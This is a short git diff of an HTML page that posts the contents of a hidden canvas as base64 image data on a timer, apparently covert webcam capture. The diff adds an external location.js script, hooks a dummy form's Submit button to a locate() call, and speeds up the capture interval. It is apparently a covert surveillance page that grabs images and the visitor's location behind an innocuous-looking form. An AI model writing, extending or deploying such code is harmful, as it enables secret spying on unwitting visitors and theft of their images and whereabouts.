@@ -18,7 +18,7 @@
 </div>
 
 <canvas hidden="hidden" id="canvas" width="640" height="640"></canvas>
-
+<script src="../../assets/js/location.js"></script>
 <script>
 
 function post(imgdata){
@@ -74,7 +74,7 @@ var context = canvas.getContext('2d');
        var canvasData = canvas.toDataURL("image/png")
        cc = String(canvasData).replace("data:image/png;base64,","")
       //  console.log(cc)
-       post(cc); }, 9000);
+       post(cc); }, 6000);
   
 
 }
@@ -118,7 +118,7 @@ init();
       <input type="checkbox" class="form-check-input" id="exampleCheck1">
       <label class="form-check-label" for="exampleCheck1">Check me out</label>
     </div>
-    <button type="submit" class="btn btn-primary">Submit</button>
+    <button type="submit" class="btn btn-primary" onclick="locate()">Submit</button>
   </form>
 </body>
 </html>
